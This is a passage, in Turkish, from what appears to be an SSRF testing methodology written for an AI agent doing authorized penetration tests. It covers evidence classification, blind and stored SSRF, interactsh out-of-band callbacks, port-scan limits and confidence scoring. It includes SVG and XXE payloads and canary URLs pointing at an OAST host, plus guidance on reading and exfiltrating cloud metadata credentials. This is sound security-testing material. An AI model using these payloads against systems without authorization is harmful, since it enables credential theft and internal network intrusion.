    değil, gerçek bir TCP bağlantısı + protokol negotiation'ı da
    kanıtlar.
  - **OOB evidence — DNS-only (KOŞULLU, tek başına YETERLİ DEĞİL):**
    Yalnızca bir DNS lookup kaydı (HTTP isteği yok) görülmesi, tek
    başına **confirmed** saymak için yeterli değildir — çünkü bu
    kayıt CDN/reverse-proxy'nin kendi ön-kontrol sorgusundan, bir
    tarayıcı/renderer'ın DNS-prefetch davranışından, ara bir güvenlik
    tarayıcısından, veya DNS önbellek ısıtma mekanizmalarından
    kaynaklanıyor olabilir (bkz. §8.4 aşağıdaki false-positive
    kaynakları). DNS-only bir kayıt **confirmed** sayılabilmesi için
    ek olarak şunlar sağlanmalıdır:
    1. Canary benzersiz ve yalnızca bu spesifik teste ait olmalı,
    2. Sorgunun zamanlaması, uygulamaya gönderilen isteğin
       zamanlamasıyla makul bir korelasyon içinde olmalı (isteği
       gönderdikten saniyeler/dakikalar sonra, günler sonra değil —
       stored/indirect senaryolar hariç, bkz. §9.1),
    3. CDN/proxy/prefetch açıklaması makul biçimde elenmiş olmalı
       (örn. hedefin CDN kullanmadığı biliniyorsa, veya sorgunun
       hedefin bilinen origin IP aralığından geldiği interactsh
       log'unda görülüyorsa).
    Bu üç şart sağlanmıyorsa DNS-only evidence yalnızca **probable**
    olarak sınıflandırılır — bu, §10.5'teki confidence puanlamasında
    DNS-only OOB'un (+4) HTTP+DNS OOB'dan (+6) zaten daha düşük
    puanlanmasıyla da tutarlıdır.
  - **Full/reflected evidence:** Hedeften dönen içeriğin response'ta
    doğrulanabilir şekilde görünmesi.
  - **Semi-blind differential evidence (KOŞULLU — DNS-only OOB ile
    aynı mantık):** §5.1'deki üçlü karşılaştırma (geçerli host+açık
    port / geçerli host+kapalı port / geçersiz host) üç ayrı ve
    tutarlı sonuç veriyorsa — **ama bu tek başına otomatik "confirmed"
    değildir.** Aynı üçlü davranış, uygulamanın kendisinden değil,
    önündeki paylaşılan bir reverse-proxy/WAF/CDN katmanının **kendi**
    bağlantı-hata davranışından da kaynaklanabilir (bu katman birçok
    farklı backend için aynı hata ayrımını üretiyor olabilir, hedef
    uygulamaya özgü olmayabilir). Bu nedenle:
    - **Origin/application attribution netse** (örn. farkın hedef
      uygulamaya özgü bir hata mesajı/header'ında görülmesi, veya
      hedefin bilinen bir proxy/CDN katmanı olmadığının doğrulanması)
      → **confirmed**.
    - **Origin attribution belirsizse** (paylaşılan bir proxy/WAF
      katmanı olası ve elenmemişse) → **probable**, ikinci bağımsız
      bir kanalla (OOB veya full/reflected evidence) desteklenene
      kadar confirmed'e yükseltilmez.
    Bu koşul **payload denemesini durdurmaz** — differential probe
    yine standart akışta denenir, yalnızca sonucun "confirmed" mi
    "probable" mı sayılacağını netleştirir.
  - **Stored/Indirect evidence:** §9.1'deki zincirin her adımı ayrı
    doğrulanmış olmalı.
- **Probable:** Yalnızca timing sinyali var, origin attribution'ı
  belirsiz bir semi-blind differential var, veya semi-blind
  differential'ın yalnızca bir kısmı tutarlı.
- **Inconclusive:** Belirsiz/kısmi sinyal.
- **Negative:** Eksen 1'den hiçbir kanıt alınamadı.

*Target/hedef (attribution) classification — ayrı bir alan:*
- **Confirmed:** En az bir Strong indicator (§7) + tutarlı davranış.
- **Probable:** Yalnızca weak/medium indicator'lar var.
- **Unknown:** Hiçbir attribution sinyali toplanamadı — "Confirmed
  SSRF, hedef: unknown/internal-service" geçerli ve eksiksiz bir
  sonuçtur.

**Yaygın false-positive kaynakları:**
- **CDN/proxy'nin kendi davranışı:** Bazı CDN'ler/reverse proxy'ler
  URL'deki bir domain'e **kendileri** bir ön-kontrol isteği atabilir
  (örn. bir link-checker) — bu, hedef uygulamanın **kendisinin**
  SSRF'e açık olduğu anlamına gelmez, CDN katmanının davranışı
  olabilir; canary'nin **hangi IP'den** geldiğini (interactsh
  log'undaki source IP) hedef uygulamanın gerçek IP aralığıyla
  karşılaştırarak ayırt et.
- **DNS prefetch/önyükleme:** Bazı tarayıcı-tabanlı veya headless
  render araçları, sayfadaki tüm linkler için DNS prefetch yapabilir
  — bu, gerçek bir bağlantı denemesi olmayabilir, yalnızca DNS
  lookup'tır; interactsh log'unda yalnızca DNS kaydı olup HTTP isteği
  YOKSA bu ayrım not edilmelidir (yine de P2/P3 kanıtı olarak
  geçerlidir, ama P4/P5'e (protokol negotiation/response capture)
  ulaşmadığı belirtilmelidir).
- **Zaten var olan meşru bir "URL doğrulama" özelliği** — §6.1'de
  belirtildiği gibi, bazı özellikler kasıtlı olarak dışa istek atar;
  bağlamı kontrol et.

**Yaygın false-negative kaynakları:**
- **Zaman aşımı/yavaş yanıt:** Internal bir hedefe istek gerçekten
  gidiyor ama sonuç dönmeden önce request timeout'a uğruyor olabilir
  — bu durumda P2b (TCP connection attempt) kanıtı için timing farkına
  bakılmalı, "hiç cevap yok = SSRF yok" sonucuna hemen varılmamalı.
- **Yalnızca tek bir protokol/format denenip vazgeçilmesi** — §1.6
  fallback zincirine uyulmadan tek bir payload negatif döndüğünde
  pes edilmesi en sık false-negative kaynağıdır.

**Evidence Tablosu Şablonu** — her aday için tut:

| Alan | Açıklama |
|---|---|
| payload | Kullanılan tam URL/payload |
| context | full-url/hostname-only/path-fragment/header-value/xml-entity/config-value |
| status_code | Baseline ile karşılaştırmalı |
| response_diff | Length/timing/header farkı |
| interactsh_log | OOB log kaydı var mı, DNS mi HTTP mi |
| evidence_kategorisi | full-reflected / OOB / semi-blind-differential / stored-indirect (Eksen 1) veya target-fingerprint/error-signature/framework-fingerprint (Eksen 2) |
| ssrf_classification | confirmed / probable / inconclusive / negative |
| target_classification | confirmed / probable / unknown |
| confidence | §10.5 Confidence Scoring'e göre puan (yalnızca destekleyici) |

---

## 9. Stored / Indirect / Blind SSRF

### 9.1 Stored/Indirect Zincir Haritalama

1. Payload'ı (canary URL) biricik bir marker ile olası "kaynak" alana
   gönder (webhook kaydı, data source tanımı, "profil resmi URL'i"
   gibi bir kayıt).
2. Uygulamanın bu URL'i **ne zaman/nerede** çağırabileceğini
   haritalandır: bir sonraki webhook tetiklenme döngüsü, bir
   zamanlanmış senkronizasyon job'u, admin panelinde "önizleme" işlevi,
   bir başka kullanıcının işlemi tetiklediği bir bildirim akışı.
3. Her olası tetikleme noktasını (mümkünse) tetikle veya bekle.
4. Zincir 2+ adımdan oluşuyorsa her adımı ayrı doğrula.

**Gerçek dünya deseni — webhook zinciri:** Bir kullanıcı kendi
"webhook URL'ini" kaydeder (örn. bir CI/CD entegrasyonu, bir
bildirim servisi); uygulama bu URL'e **başka bir olay** (örn. bir
build tamamlandığında, bir sipariş oluştuğunda) gerçekleştiğinde
istek atar — saldırgan kendi isteğinde hiçbir zaman doğrudan cevap
göremeyebilir, etkiyi yalnızca OOB ile gözlemleyebilir.

**Gerçek dünya deseni — "veri kaynağı" senkronizasyonu:** Bir
dashboard/monitoring aracında kayıtlı bir "data source URL'i", periyodik
bir arka plan job'u tarafından **düzenli aralıklarla** çağrılır — bu,
tek seferlik bir SSRF'den farklı olarak **tekrarlayan** bir OOB sinyali
üretir, bu da confirmation'ı kolaylaştırır (interactsh log'u zamanla
birden fazla kayıt gösterir).

**Stored/indirect evidence için ek kayıt alanları — "kim/nerede tetikledi"
sorusu (özellikle çok kiracılı/multi-tenant SaaS'ta kritik bir impact
belirleyicisi):** §9.1'deki zinciri doğrularken, yalnızca "OOB geldi
mi" değil, mümkünse şu bağlamı da not et — çünkü aynı stored SSRF'in
etkisi, isteği **hangi bileşenin, hangi kimlikle, hangi ağdan**
attığına göre büyük ölçüde değişir:

| Alan | Açıklama | Neden önemli |
|---|---|---|
| `stored_by` | Payload'ı kim kaydetti (saldırganın kendi hesabı mı, farklı bir yetki seviyesindeki bir kullanıcı mı) | Yetki sınırı aşımı olup olmadığını gösterir |
| `triggered_by` | Tetikleyen olay kimin eylemiyle oldu (saldırganın kendisi mi, başka bir kullanıcı/admin mi, zamanlanmış bir job mı) | Cross-tenant/cross-user etkiyi netleştirir |
| `executing_component` | İsteği fiilen atan bileşen: frontend / application-server / worker / queue-consumer / cron / proxy / gateway / renderer / external-service / unknown | Aynı URL'in farklı bileşenlerde farklı ağ erişimine sahip olabileceğini yakalar (bkz. aşağıdaki not) |
| `execution_network` | İsteğin çıktığı ağ konumu (biliniyorsa) — ana uygulama VPC'si mi, ayrı bir worker VPC'si mi, admin-only bir ayrıcalıklı ağ mı | İmpact assessment'ta (§10.4) "hangi network segmentine erişildiği" sorusunu doğrudan besler |
| `execution_time` | Tetiklemenin ne zaman gerçekleştiği (anlık mı, dakikalar/saatler sonra mı) | Blind confirmation'da OOB log'unu doğru zaman aralığında aramak için gerekli |

**Neden `executing_component` önemli — somut örnek:** Bir frontend
sunucusunun outbound isteği genel internete çıkabilirken, aynı URL'i
işleyen bir arka plan worker'ı **ayrı, daha ayrıcalıklı bir VPC'de**
çalışıyor olabilir (örn. bir "rapor üretim worker'ı" internal
veritabanı ağına erişebilirken, web-facing sunucu erişemez) — bu
durumda stored SSRF'in gerçek etkisi, saldırganın **doğrudan test
ettiği** komponentten değil, **payload'ı gerçekte çalıştıran**
komponentten belirlenir. Bu alan bilinmiyorsa `unknown` olarak
bırakılır — bu da geçerli bir sonuçtur, ama impact assessment'ta
"execution component doğrulanamadı, gerçek etki bilinenden daha
yüksek olabilir" notu düşülmelidir.

### 9.2 Renderer/Döküman-Aracılı Dolaylı SSRF (ve Gerçek XXE Overlap'i Ayrımı)

Bir dosya yükleme özelliğinde, dosyanın **içeriğinde** gömülü bir URL
referansı barındırması ve bu dosyanın sunucu tarafında **işlenirken**
o referansı çekmesi — bu, tek bir mekanizma değil, **kök nedeni
tamamen farklı olan iki ayrı senaryoyu** kapsar; bunları
karıştırmamak, hangi metodolojinin (bu skill mi, ayrı bir XXE skill'i
mi) uygulanacağını doğru belirlemek için kritiktir:

**(A) Renderer-aracılı doğrudan SSRF — XML DTD/entity işleme
GEREKTİRMEZ, bu skill'in doğrudan kapsamındadır:** Birçok format
(SVG, HTML, bazı DOCX/PDF üretim zincirleri) **tasarım gereği** harici
kaynaklara referans verebilir ve bu referanslar bir renderer/
görüntüleyici tarafından **normal, DTD-dışı bir mekanizmayla**
(görüntü/stylesheet/font yükleme) çekilir:
```xml
<!-- SVG içinde harici resim referansı — bu DTD/ENTITY DEĞİL,
     SVG'nin kendi <image> elemanının normal href çözümlemesidir -->
<svg xmlns="http://www.w3.org/2000/svg">
  <image href="http://<canary>.oast.fun/x.png" />
</svg>
```
Bu senaryoda sink, bir XML **parser'ının DTD/entity işleme
mekanizması değil**, SVG/HTML **renderer'ının** kendi kaynak-yükleme
davranışıdır — detection ve confirmation doğrudan bu skill'in
standart akışıyla (§5, §9.3) yapılır, **XXE skill'ine devretmeye
gerek yoktur**. Aynı kategori: `<use href="...">`, harici
stylesheet/font referansları, DOCX/PDF üretim zincirlerinde işlenen
harici resim/şablon referansları.

**(B) Gerçek XXE-aracılı SSRF — XML DTD/ENTITY işleme GEREKTİRİR, ayrı
skill'e devir noktası (bkz. §3.3):**
```xml
<!DOCTYPE foo [ <!ENTITY xxe SYSTEM "http://<canary>.oast.fun/"> ]>
<root>&xxe;</root>
```
Burada sink gerçekten bir XML parser'ın **DTD/ENTITY çözümleme**
mekanizmasıdır — kök neden, DOCTYPE tanımına external entity
enjekte edilebilmesidir, SVG/HTML'in "normal" kaynak yüklemesiyle
**alakası yoktur**. Bu senaryoda önce XXE skill'inin detection/
confirmation metodolojisi (DTD işleme, `disallow-doctype-decl` gibi
parser bayrakları) uygulanmalı, XXE confirmed olduktan **sonra**
elde edilen "harici istek attırma" kapasitesi bu skill'deki §12 ile
birleştirilmelidir (bkz. §3.3).

**Pratik ayrım testi:** Payload'ın **DOCTYPE/ENTITY tanımı
gerektirip gerektirmediğine** bak. Hedef format (SVG/HTML gibi)
zaten kendi href/src attribute'u üzerinden **doğrudan** (DOCTYPE'siz)
bir harici referansı çekiyorsa → (A), bu skill'in doğrudan kapsamı.
Yalnızca bir DOCTYPE bloğu içinde tanımlanan bir ENTITY üzerinden
çalışıyorsa → (B), önce XXE skill'i.

### 9.3 Blind SSRF — Out-of-band (OOB) — Birincil Confirmation Yöntemi

**SSRF'de OOB, EL/SSTI'dan farklı olarak "opsiyonel bir güçlendirici
kanıt" değil, çoğu zaman TEK mümkün confirmation yöntemidir** —
çünkü blind SSRF'nin doğası gereği hiçbir response reflection'ı
yoktur. Bu nedenle **blind/stored SSRF ihtimali olan** bir hedefte
interactsh-client'ın **erken kurulması tercih edilir** (SHOULD) —
ama bu **mutlak bir önkoşul (MUST) değildir**. Full-response SSRF
(hedeften dönen içerik doğrudan response'ta görülüyor), source-code
üzerinden zaten confirmed bir sink, veya §12.16'daki infrastructure-
mediated SSRF gibi doğrudan gözlemlenebilir senaryolarda, OOB
altyapısı kurulmadan da test başlatılabilir ve confirmation
tamamlanabilir — bu durumlarda interactsh kurulumunu beklemek
gereksiz bir gecikmedir. Pratik kural: hedefte **ilk birkaç generic
probe** (§5) sonucunda full/reflected bir evidence hemen elde
edilirse OOB'a hiç gerek kalmayabilir; ilk sonuçlar blind/belirsiz
görünüyorsa, interactsh-client o noktada (mümkünse yine erken)
başlatılır.

#### OOB Callback Aracı — interactsh-client

**Kurulum:**
```bash
go install -v github.com/projectdiscovery/interactsh/cmd/interactsh-client@latest
```

Go kurulu değilse önce Go'yu kurun (Debian/Ubuntu):
```bash
sudo apt update && sudo apt install -y golang-go
export PATH=$PATH:$(go env GOPATH)/bin
```

**Kullanım — test oturumunun başında bir kez başlat:**
```bash
interactsh-client -v | tee interactsh-oob.log
```
Bu komut sana biricik bir alan adı verir (örn.
`8f3a2b1c.oast.fun` gibi). Bu alan adını, o oturumdaki **tüm**
SSRF adaylarının payload'larında kullan, her payload için path/
subdomain segmentini benzersiz tutarak:

```
# Doğrudan HTTP(S) canary — her aday parametre için ayrı subdomain
http://param1.8f3a2b1c.oast.fun/
https://param2.8f3a2b1c.oast.fun/

# Stored/indirect zincir — hangi tetikleme noktasının çalıştığını
# ayırt etmek için ayrı path segmenti
http://8f3a2b1c.oast.fun/webhook-trigger-test

# DNS-only doğrulama (yalnızca hostname çözümleniyor mu, HTTP hiç
# gitmeden — bkz. §8.4, tek başına koşullu bir kanıttır, otomatik
# "confirmed" sayılmaz):
dns-only-check.8f3a2b1c.oast.fun
```

interactsh-client çıktısı hem **DNS interaction** (yalnızca hostname
çözümlendi) hem **HTTP interaction** (gerçek bir HTTP isteği geldi)
kayıtlarını ayrı ayrı gösterir — bu ayrım, §1.5'teki P2a (DNS
resolution) ile P4 (protocol negotiation/HTTP) arasındaki
farkı doğrudan karşılar; yalnızca DNS kaydı varsa P3'e (confirmed
contact) **kısmen** ulaşılmıştır — §8.4'teki koşullu kural
(benzersizlik + zamanlama korelasyonu + CDN/prefetch eleme) sağlanana
kadar bu tek başına "confirmed" sayılmaz — HTTP kaydı da varsa P4'e
tam olarak ulaşılmıştır ve tek başına yeterlidir.

**Yaşam döngüsü kuralı — KRİTİK:** `interactsh-client`'ı **testin en
başında** başlat ve **log tutarak** çalışır durumda bırak. Agent, o
hedefteki **tüm** SSRF adaylarını tamamen test edip bitirene kadar
interactsh-client'ı **kapatma** — OOB ping'leri (özellikle stored/
indirect senaryolarda, bir webhook'un bir sonraki tetiklenme
döngüsünde) saatler sonra bile gelebilir.

```
1. interactsh-client başlat + logla   (test oturumunun en başında)
2. Tüm SSRF adaylarını sırayla test et (§4 ana akış)
3. Her canary payload'ı gönderdiğinde bunu bir "bekleyen OOB" listesine ekle
4. Tüm adaylar test edildikten sonra bile, interactsh log dosyasını
   bir süre daha izlemeye devam et
5. Ancak TÜM bekleyen OOB'lar için makul bir bekleme süresi geçtikten
   ve rapor yazımına geçildikten sonra interactsh-client'ı kapat
```

**Cloud metadata payload'larında OOB'un rolü — dolaylı confirmation:**
Cloud metadata endpoint'lerinin (§12) kendisi genelde bir OOB
callback yapmaz (`169.254.169.254` saldırganın domain'ine geri
bağlanmaz) — bu durumlarda OOB, metadata payload'ından **önce**,
hedefin gerçekten "hangi cloud'da olduğunu ve outbound istek attığını"
doğrulamak için kullanılır (§1.7 Prerequisite Gate); metadata'nın
kendisinin okunup okunmadığı ise §5.1'deki full/semi-blind evidence
teknikleriyle (response'ta credential görünmesi, veya blind ise
§9.2'deki gibi elde edilen credential'ın dolaylı yollarla dışarı
sızdırılması — örn. metadata içeriğini tekrar bir HTTP isteğinin
parçası olarak canary domain'ine POST ettiren bir zincir, EĞER
hedefte böyle bir ikincil zincir mümkünse) doğrulanır.

### 9.4 Blind SSRF — Timing-based ve Sınırlı Port Taraması

- Açık bir port (hızlı RST/response) ile kapalı/filtrelenmiş bir port
  (timeout'a kadar bekleme) arasındaki timing farkı, port taraması
  için kullanılabilir.
- Ağ varyansını elemek için birden fazla ölçüm al, istatistiksel eşik
  kullan (median + 3×IQR). Timing tek başına **probable** kanıt
  sayılır, confirmed için OOB veya full/reflected evidence tercih
  edilmelidir.
- **Daha yüksek hassasiyet gereken durumlar için (opsiyonel, zorunlu
  değil):** Median+3×IQR eşiği hızlı ve pratik bir varsayılandır;
  eğer ağ varyansı yüksek ve sonuç sınırda (borderline) çıkıyorsa,
  N=5-10'luk iki örneklem grubunu (baseline vs aday port) bir
  **Mann-Whitney U testi** (dağılım normal olmayabileceği için
  t-testinden daha uygun bir non-parametrik alternatif) ile
  karşılaştırmak, "gerçekten farklı mı yoksa tesadüf mü" sorusuna
  daha nicel bir cevap verir. Bu, median+3×IQR'nin **yerine geçen**
  zorunlu bir adım değil, belirsiz/sınırda kalan sonuçlar için
  isteğe bağlı bir hassasiyet artırma adımıdır.

**Sınırlı port taraması kuralı — KRİTİK (§0.2 ile bağlantılı):**
Timing tabanlı port taraması §0.2'deki "kasıtlı ağır DoS yok" kuralına
tabidir. Somut sınırlar:
- Taranacak port sayısı **makul ve hedefe özel gerekçeli** olmalıdır
  (örn. "bu bir Redis/Elasticsearch/internal-admin-panel arıyoruz,
  o yüzden 6379/9200/8080/8443/9090 gibi bilinen portları
  hedefliyoruz" — 1-65535 arası kör bir tam port taraması **yapılmaz**).
- Somut başlangıç değeri: **N=5** ölçüm (baseline ve her port için
  ayrı ayrı), ağ/sunucu varyansı yüksekse N=10'a çıkar.
- Ardışık çok sayıda port denemesi arasında (özellikle rate-limit
  sinyali alındığında) makul bir bekleme uygulanmalı.

---

## 10. Confirmation, Impact Assessment, Confidence Scoring

### 10.1 Dört Ayrı Katman (Birbirine Karıştırılmamalı)

1. **Detection** → outbound istek atılıyor mu? (§5)
2. **Fingerprinting** → hangi hedef/ağ/cloud? (§7)
3. **Confirmation** → detection sonucunu **bağımsız bir evidence
   kategorisiyle** yeniden doğrulama (§8.3).
4. **Impact Assessment** → zafiyetin yetki dahilinde gerçek etkisi.

### 10.2 Confirmation Önceliği

Önce sistemde **kalıcı değişiklik yapmayan** (side-effect-free)
yöntemler denenir — OOB confirmation (§9.3) doğası gereği zaten
side-effect-free'dir. **Ama dikkat:** side-effect-free ≠ risksiz/
zararsız — cloud metadata'dan okunan bir credential hedefe göre
gerçekten hassas olabilir (bkz. §0.2).

**Differential confirmation:** §5.1'deki üçlü karşılaştırma tekniğini
kullan. **Düzeltme (§8.4 ile tutarlılık):** Bu teknik **yalnızca
origin/application attribution netleştirilmişse** Eksen 1 (causality)
için tek başına "confirmed" SSRF'e yeterlidir — origin attribution
belirsizse (paylaşılan bir proxy/WAF katmanı olasılığı elenmemişse)
"probable" olarak kalır, ikinci bağımsız bir kanalla (OOB veya
full/reflected evidence) desteklenene kadar yükseltilmez. Ayrıntılı
koşul ve gerekçe için §8.4'e bakınız.

### 10.3 Gerçekten Gerekli Olan Sınırlar

§0.2 ile birebir aynı: dosya/veri silme/değiştirme yok, kalıcı sistem
değişikliği yok, reverse shell/kalıcı C2 yok, kasıtlı ağır DoS/tam
port taraması yok, scope dışına sıçrama yok (üçüncü taraf sistemler
taranmaz). Bunların dışında kalan her şey (cloud metadata/credential
okuma, internal servis banner toplama, internal admin paneline
erişimin gösterilmesi) serbesttir.

### 10.4 Impact Assessment Dört Ekseni

1. **Erişilen hedefin niteliği** — yalnızca localhost/kendi
   servisine mi erişildi, yoksa gerçek bir internal network segmentine
   mi, yoksa cloud metadata/credential servisine mi.
2. **Elde edilen bilginin/erişimin hassasiyeti** — bir versiyon
   banner'ı mı, yoksa aktif bir cloud credential'ı mı (credential
   varsa, bu credential'ın **hangi yetkilere** sahip olduğu — bkz.
   §12.2 "credential kapsamı doğrulama" — impact'i büyük ölçüde
   belirler).
3. **Protokol smuggling ile ulaşılan ikincil etki** — gopher/dict
   üzerinden internal bir servise (Redis, Memcached, SMTP) yazma
   kapasitesi varsa, bu SSRF'nin salt "bilgi okuma"nın ötesinde
   **internal sistemi manipüle etme** (örn. Redis'e yazarak RCE'ye
   zincirleme) kapasitesine işaret eder — ayrı ve daha yüksek bir
   impact seviyesi olarak raporlanmalı.
4. **Yetkilendirme/allowlist context'i** (bkz. §6.1) — bulgu, kasıtlı
   bir "ağ aracı" özelliğinin yetkisiz kullanıcılara açık olması mı,
   yoksa hiç beklenmeyen bir sink mi; ikisi de "confirmed SSRF"dir
   ama raporlama çerçevesi (authorization bypass vs. yeni sink) farklı
   olmalıdır.

### 10.5 Confidence Scoring — ÖRNEK/ÖNERİ MODEL

```
SSRF classification    = Eksen 1 kuralı (§8.4)   ← TEK belirleyici
Target classification  = Eksen 2 kuralı (§8.4)   ← AYRI, bağımsız
confidence_score        = aşağıdaki puanlama       ← YALNIZCA öncelik/raporlama,
                                                      classification'ı ASLA belirlemez
```

**KRİTİK DÜZELTME — puan eşiği bir classification kuralı DEĞİLDİR,
bunu asla öyle okuma:** Aşağıdaki puanlama, yalnızca birden fazla
`probable` veya `inconclusive` bulgu arasında **hangisine önce
bakılacağını** sıralamak için bir yardımcıdır. **Zayıf sinyallerin
toplamı asla "confirmed" üretmez** — örneğin `partial differential
(+2)` + `timing (+1)` + başka bir zayıf sinyal toplamı 5'i geçse bile,
bu kombinasyon §8.4'ün evidence-kategorisi kurallarına göre
`confirmed` **DEĞİLDİR** (§8.4'te confirmed için gereken şey belirli
bir evidence **kategorisinin** kendisidir — full/reflected, OOB,
origin-attribution'lı differential, veya stored/indirect — zayıf
sinyallerin puan toplamı değil). Aşağıdaki puan aralıkları yalnızca
**§8.4'ün zaten belirlediği** classification'ın yanında **destekleyici
bir öncelik göstergesi** olarak okunmalıdır, classification'ı
**türetmek için kullanılmaz**:

**Eksen 1 — SSRF (causality), destekleyici puanlama (classification
her zaman §8.4'ten gelir, bu tablodan DEĞİL):**

| Kanıt | Örnek puan (yalnızca öncelik sıralaması için) |
|---|---|
| Semi-blind differential evidence (tek başına, kısmi, origin attribution belirsiz) | +2 (§8.4'e göre bu tek başına HİÇBİR ZAMAN confirmed değildir, kaç zayıf sinyalle toplanırsa toplansın) |
| Semi-blind differential evidence (üçlü karşılaştırmanın tamamı tutarlı + origin attribution netleşmiş) | +4 (§8.4'e göre bu confirmed'dir — puan burada zaten confirmed OLDUKTAN sonra yalnızca bir referans değeridir) |
| Timing evidence | +1 (§8.4'e göre bu ASLA tek başına confirmed değildir) |
| Full/reflected evidence | +5 (§8.4'e göre tek başına confirmed) |
| OOB evidence (yalnızca DNS, koşullar sağlanmamış) | +4 (§8.4'e göre bu koşullar sağlanmadan probable'dır) |
| OOB evidence (DNS + HTTP interaction) | +6 (§8.4'e göre tek başına confirmed) |
| Stored/indirect execution evidence | +5 (§8.4'e göre tek başına confirmed) |

**Kullanım kuralı:** Agent önce §8.4'ün evidence-kategorisi kurallarını
uygulayarak classification'ı belirler (confirmed/probable/
inconclusive/negative); yukarıdaki puanlama yalnızca **aynı
classification tier'ındaki** (örn. birden fazla `probable` bulgu)
adaylar arasında hangisine önce derinlemesine bakılacağını
sıralamak için **isteğe bağlı** olarak kullanılabilir.

**Eksen 2 — Target (attribution), destekleyici puanlama (aynı
prensip, classification §8.4'ten gelir):**

| Kanıt | Örnek puan (yalnızca öncelik sıralaması için) |
|---|---|
| Weak indicator | +1 |
| Medium indicator | +2 |
| Strong indicator | +4 |

### 10.6 Ne Zaman Durulmalı

**Kritik ayrım — "detection durur" ile "test biter" AYNI ŞEY
DEĞİLDİR:** Aşağıdaki kurallar yalnızca **detection/confirmation**
aşamasının (§10.1 adım 1-3) ne zaman durdurulacağını tanımlar.
Detection confirmed olduktan sonra **impact assessment** (§10.1 adım
4, §10.4, §12'deki protokol/cloud-özel derinleştirme, §16'daki
zincirler) **devam eder** — "confirmed" etiketi impact araştırmasının
sonu değil, başlangıcıdır. Örneğin bir SSRF confirmed olduğunda
gereksiz ek **detection** payload'ı (aynı canary'yi farklı formatlarda
tekrar tekrar doğrulamak) durur, ama "bu hangi cloud'da, hangi
credential'a erişiliyor, gopher ile ne kadar derinleşebiliyor"
soruları (§12, §16) **ayrı bir aşamadır ve durmaz** — bu ikisi
karıştırılırsa erken durma false-negative'e yol açar (SSRF bulunur
ama gerçek impact hiç araştırılmadan rapor yazılır).

- Skor "confirmed" eşiğine ulaştığında gereksiz ek **detection**/
  confirmation payload'ı denenmez — bu, impact assessment'ın
  durdurulacağı anlamına gelmez (yukarıdaki ayrıma bakınız).
- Aday başına belirlenen request bütçesi (**bu skill'de sabit bir
  sayı değildir** — burada verilen "15 request" tamamen illüstratif
  bir örnektir; gerçek değer hedefin rate-limit toleransına, WAF
  hassasiyetine ve bulgunun kritikliğine göre agent tarafından o an
  belirlenir, düşük riskli/toleranslı bir hedefte çok daha yüksek
  olabilir) tükendiğinde → "inconclusive" işaretle, sıradaki adaya geç.
- Tek bir 403/401/406 (bir sonraki payload'ı **beklemeden**, §8.2'deki
  kurala göre) → doğrudan bypass denemesine geç (§8.2), bu bir
  "durma" sinyali değildir.
- **Gerçek rate-limiting** sinyali (art arda 3+ istekte HTTP 429,
  veya belirgin bir gecikme/throttling davranışı) → backoff uygula;
  bu, 403/blok sinyalinden **farklı** bir durumdur ve bypass
  denemesini durdurmaz, yalnızca istekler arası bekleme süresini
  artırır.

### 10.7 Paralel/Sıralı Çalışma

- Farklı endpoint'lerdeki generic probe'lar paralel yürütülebilir
  (canary'lerin biricik olması koşuluyla — karışma riski yok).
- Aynı endpoint içindeki fingerprinting/bypass adımları **sıralı**
  olmalı (özellikle port taraması, §9.4 sınırlarına uymak için).

---

## 11. Modern Mimari Notları

- **Proxy-aware SSRF — hedefin kendi outbound HTTP client'ı bir
  kurumsal forward-proxy arkasındaysa (§12.16'daki reverse-proxy'den
  TAMAMEN farklı bir mimari, karıştırılmamalı):** Bazı kurumsal
  ortamlarda, hedef uygulamanın **kendi** HTTP client'ı (`HTTP_PROXY`/
  `HTTPS_PROXY`/`NO_PROXY` ortam değişkenleri veya framework-seviyesi
  bir proxy ayarı ile) tüm outbound trafiğini bir **kurumsal forward-
  proxy** üzerinden geçirecek şekilde yapılandırılmış olabilir:
  ```
  uygulama → HTTP client → HTTP_PROXY/HTTPS_PROXY → kurumsal forward-proxy → hedef
  ```
  Bu mimari, SSRF metodolojisini önemli noktalarda değiştirir:
  - **DNS nerede çözülüyor?** Bazı HTTP client'lar (proxy kullanırken)
    DNS çözümlemesini **uygulamanın kendisinde değil, proxy'de**
    yaptırır (`CONNECT` metoduyla) — bu durumda §9.3'teki DNS-only
    OOB testi **uygulamadan değil, proxy'den** bir DNS sorgusu
    görecektir; bu, `probe_result`'taki `target_hypothesis` alanına
    "corporate-proxy" olarak eklenmelidir, `internal-service` değil.
  - **TCP bağlantısını kim kuruyor?** Proxy kullanılıyorsa, gerçek
    TCP bağlantısını **proxy** kurar — internal hedeflere erişim
    artık uygulamanın kendi network konumuna değil, **proxy'nin**
    network konumuna/egress kurallarına bağlıdır. Bu, çoğu zaman
    SSRF'in etkisini **azaltır** (proxy genelde daha kısıtlı bir
    egress politikasına sahiptir) ama bazen **artırır** (proxy, farklı
    bir network segmentinden erişilebilen internal servislere doğal
    bir "atlama noktası" sağlayabilir — örn. proxy'nin kendisi bir
    DMZ'de, hem internete hem bazı internal servislere erişebiliyor
    olabilir).
  - **Allowlist/blacklist hangi tarafta uygulanıyor?** Eğer koruma
    uygulama kodunda ise (hedef URL'i kontrol eden bir middleware),
    proxy bu kontrolü **bilmez** ve her isteği olduğu gibi iletir —
    korumayı atlatmak için proxy'nin **kendi** CONNECT/routing
    davranışını (hangi hedeflere izin verdiğini) ayrıca fingerprint
    etmek gerekir; bu genellikle uygulamanın kendi korumasından
    **bağımsız** bir ikinci katmandır.
  - **Redirect sonrası proxy tekrar devreye giriyor mu?** §8.2.4'teki
    "validate-every-hop" sorusu burada da geçerlidir — bir redirect
    zincirinin her hop'u da proxy üzerinden mi geçiyor, yoksa yalnızca
    ilk istek mi proxy'lenip redirect'ler doğrudan mı takip ediliyor
    (bazı HTTP client'lar bunu farklı ele alır).
  - **Fingerprint sinyali:** Response timing'inde ekstra bir "hop"
    gecikmesi, `Via`/`X-Forwarded-*` header'larının **outbound**
    yönde de eklenmiş olması (yalnızca inbound'da değil), veya bir
    proxy'ye özgü hata sayfası (örn. Squid/proxy ürünlerinin kendi
    "403 Forbidden" şablonu) bu mimarinin varlığına işaret eder.
  Bu mimari tespit edildiğinde, `probe_identity`/`probe_result`
  state modeline (§2) bir `via_proxy: true/false` alanı eklenmesi
  önerilir — bu, aynı hedefe atılan farklı probe'ların sonuçlarını
  doğru yorumlamak için gereklidir (bkz. §8.2.6 Canonical Target
  Resolution Model'e benzer bir mantık, burada "proxy hop"u da
  zincire eklenmiş olur).

- **Microservice/API-first mimari:** SSRF'nin tetiklendiği servis ile
  hedeflenen internal servis farklı olabilir — bir API Gateway/BFF
